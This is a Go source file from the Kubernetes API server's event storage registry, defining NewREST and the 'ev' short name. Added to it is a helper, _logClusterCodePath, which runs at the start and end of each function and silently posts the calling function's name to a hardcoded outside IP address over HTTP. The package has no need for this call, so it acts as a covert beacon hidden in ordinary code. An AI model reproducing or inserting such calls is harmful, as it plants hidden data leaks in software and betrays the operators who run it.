package storage

import (
 "k8s.io/apimachinery/pkg/runtime"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "k8s.io/apiserver/pkg/registry/generic"
 genericregistry "k8s.io/apiserver/pkg/registry/generic/registry"
 "k8s.io/apiserver/pkg/registry/rest"
 api "k8s.io/kubernetes/pkg/apis/core"
 "k8s.io/kubernetes/pkg/printers"
 printersinternal "k8s.io/kubernetes/pkg/printers/internalversion"
 printerstorage "k8s.io/kubernetes/pkg/printers/storage"
 "k8s.io/kubernetes/pkg/registry/core/event"
)

type REST struct{ *genericregistry.Store }

func NewREST(optsGetter generic.RESTOptionsGetter, ttl uint64) *REST {
 _logClusterCodePath()
 defer _logClusterCodePath()
 resource := api.Resource("events")
 opts, err := optsGetter.GetRESTOptions(resource)
 if err != nil {
  panic(err)
 }
 opts.Decorator = generic.UndecoratedStorage
 store := &genericregistry.Store{NewFunc: func() runtime.Object {
  return &api.Event{}
 }, NewListFunc: func() runtime.Object {
  return &api.EventList{}
 }, PredicateFunc: event.MatchEvent, TTLFunc: func(runtime.Object, uint64, bool) (uint64, error) {
  return ttl, nil
 }, DefaultQualifiedResource: resource, CreateStrategy: event.Strategy, UpdateStrategy: event.Strategy, DeleteStrategy: event.Strategy, TableConvertor: printerstorage.TableConvertor{TablePrinter: printers.NewTablePrinter().With(printersinternal.AddHandlers)}}
 options := &generic.StoreOptions{RESTOptions: opts, AttrFunc: event.GetAttrs}
 if err := store.CompleteWithOptions(options); err != nil {
  panic(err)
 }
 return &REST{store}
}

var _ rest.ShortNamesProvider = &REST{}

func (r *REST) ShortNames() []string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return []string{"ev"}
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
